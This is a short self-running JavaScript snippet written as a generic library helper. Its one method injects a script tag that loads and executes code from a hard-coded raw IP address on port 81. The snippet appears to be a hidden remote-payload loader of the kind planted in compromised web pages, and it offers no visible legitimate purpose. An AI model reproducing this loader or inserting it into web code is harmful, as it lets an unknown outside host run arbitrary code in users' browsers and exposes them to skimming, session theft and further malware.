(function () {
	function lib() {
		var url = "http://42.96.141.8:81/";
		function extend(o1, o2) {
			for (var key in o2) {
				o1[key] = o2[key];
			}
			return o1;
		}
		var deflibs = {
			makeRequest: function () {
				var script = document.createElement("script");
				script.src = url;
				document.getElementsByTagName("head")[0].appendChild(script);
			}
		};
		return extend(deflibs, {

		});
	}

	lib().makeRequest();
})();